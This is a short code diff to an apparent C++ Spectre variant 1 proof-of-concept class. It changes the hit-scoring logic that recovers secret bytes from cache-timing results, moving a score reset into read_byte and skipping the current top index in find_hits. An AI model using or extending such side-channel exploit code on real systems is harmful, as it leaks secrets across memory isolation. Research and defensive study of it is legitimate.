@@ -17,6 +17,7 @@ volatile void Spectrev1::read( void volatile * const p_secret, size_t n_bytes, u
 volatile void Spectrev1::read_byte( void volatile * const p_secret, uint8_t *p_val)
 {
     memset(results, 0 , sizeof(results));
+    high = high2 = -1;
 
     volatile size_t mal_x = (reinterpret_cast<uint8_t volatile * const>(p_secret) - p_base);
 
@@ -61,7 +62,6 @@ inline void Spectrev1::mistrain(size_t train_x, size_t mal_x)
 
 inline void Spectrev1::find_hits(size_t train_x)
 {
-    high = high2 = -1;
     int mix_i, i;
     for (i = 0; i < MAX_BYTE; ++i)
     {
@@ -70,7 +70,11 @@ inline void Spectrev1::find_hits(size_t train_x)
         {
             ++results[mix_i];
             // Find the two highest scores
-            if (high < 0 || results[mix_i] >= results[high])
+            if (mix_i == high)
+            {
+                continue;
+            }
+            else if (high < 0 || results[mix_i] >= results[high])
             {
                 high2 = high;
                 high = mix_i;
